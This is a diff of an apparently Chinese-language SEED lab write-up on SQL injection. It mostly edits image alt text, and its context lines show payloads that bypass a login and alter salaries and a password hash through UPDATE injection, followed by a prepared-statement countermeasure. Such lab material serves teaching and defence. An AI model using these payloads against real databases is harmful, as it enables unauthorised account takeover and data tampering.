@@ -94,7 +94,7 @@ $sql = "SELECT id, name, eid, salary, birth, ssn, address, email,
 admin';#
 ```
 
-<img src="/assets/post/images/sql2.webp" alt="sql2" style="width:min(100%,300px);" />
+<img src="/assets/post/images/sql2.webp" alt="sql 注入结果" style="width:min(100%,300px);" />
 
 ### Task 2.2: SQL Injection Attack from command line
 
@@ -122,7 +122,7 @@ Alice'; update credential set name=A where ID=1;#
 
 可以看到注入不成功
 
-<img src="/assets/post/images/sql4.webp" alt="sql4" />
+<img src="/assets/post/images/sql4.webp" alt="sql 注入不成功" />
 
 ## Task 3: SQL Injection Attack on UPDATE Statement
 
@@ -150,9 +150,9 @@ $conn->query($sql);
 ',salary='30000' where ID=1;#
 ```
 
-<img src="/assets/post/images/sql5.webp" alt="sql5" style="width:min(100%,300px);" />
+<img src="/assets/post/images/sql5.webp" alt="Modify your own salary" style="width:min(100%,300px);" />
 
-### Task 3.2: Modify other people’s alary
+### Task 3.2: Modify other people’s salary
 
 这个和上面的几乎一模一样，比如我们把 Boby 的薪水改成 114514
 
@@ -160,17 +160,17 @@ $conn->query($sql);
 ',salary='114514' where ID=2;#
 ```
 
-<img src="/assets/post/images/sql6.webp" alt="sql6" style="width:min(100%,300px);" />
+<img src="/assets/post/images/sql6.webp" alt="Modify other people’s salary" style="width:min(100%,300px);" />
 
 看到已经改掉了
 
-<img src="/assets/post/images/sql7.webp" alt="sql7" style="width:min(100%,300px);" />
+<img src="/assets/post/images/sql7.webp" alt="Modify other people’s salary 结果" style="width:min(100%,300px);" />
 
 ### Task 3.3: Modify other people’s password
 
 查看代码，看到密码采用的是 sha1，我们随便找个在线转换网站转换一下就好了。
 
-<img src="/assets/post/images/sql8.webp" alt="sql8" style="width:min(100%,300px);" />
+<img src="/assets/post/images/sql8.webp" alt="Modify other people’s password" style="width:min(100%,300px);" />
 
 然后注入
 
@@ -178,7 +178,7 @@ $conn->query($sql);
 ',Password='1f82c942befda29b6ed487a51da199f78fce7f05' where ID=1;#
 ```
 
-<img src="/assets/post/images/sql9.webp" alt="sql9" style="width:min(100%,300px);" />
+<img src="/assets/post/images/sql9.webp" alt="Modify other people’s password 结果" style="width:min(100%,300px);" />
 
 然后现在可以用密码 `888888` 成功登录 Alice 账号。
 
@@ -214,7 +214,7 @@ $stmt->fetch();
 
 可以看到，攻击失败了
 
-<img src="/assets/post/images/sql11.webp" alt="sql11" />
+<img src="/assets/post/images/sql11.webp" alt="Countermeasure — Prepared Statement 结果" />
 
 ## 实验总结
 
